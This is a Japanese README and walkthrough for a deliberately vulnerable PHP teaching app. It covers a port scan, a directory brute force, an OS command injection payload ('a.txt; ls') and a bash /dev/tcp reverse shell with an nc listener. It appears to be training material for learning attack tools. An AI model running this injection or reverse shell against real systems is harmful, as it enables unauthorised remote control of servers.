# vulnable_sample
ツールの使い方を簡単に実践するための簡単な環境．教材開発のサンプルプログラムの１つ
## 使い方
### 簡単な実行の仕方(実環境では絶対に行わないように)
```php -S localhost:8080```
## Writeup
### ポートスキャン  
```
nmap -p- localhost
> 8080/tcp closed http-proxy
```
### ディレクトリブルートフォース　　
```
dirb http://localhost /usr/share/wordlists/dirb/common.txt
> + http://localhost:8080/command (CODE:200|SIZE:434)                       
> + http://localhost:8080/robots.txt (CODE:200|SIZE:32)
```
### web調査
ブラウザでhttp://localhost:8080を開くと空ページ  
robots.txtを確認するとcommandというページがある事がわかる  
/commandにアクセスするとOpen Fileというページ  
ソースコードを見るとサイトの使い方が書いている  

### エクスプロイト
```
OSコマンドインジェクションを行える
a.txt; ls
でlsコマンドが実行できる
```
### リバースシェル  
(環境によって実行できない場合があるためその際は"Reverse Shell Cheat Sheet"などで調べるとPythonを使う方法やJavaを使う方法などさまざな方法が見つけられるので参考にしてください．)
```
# 手元のPCで実行
nc -nvlp 1234
```
```
# 対象のPCに対して
bash -i >& /dev/tcp/127.0.0.1/1234 0>&1
```
---
以上の流れでサーバのIPアドレスだけからWebページが空いている事を見つけて，攻撃に繋げる一連の流れの簡単な例を試してみる事ができます

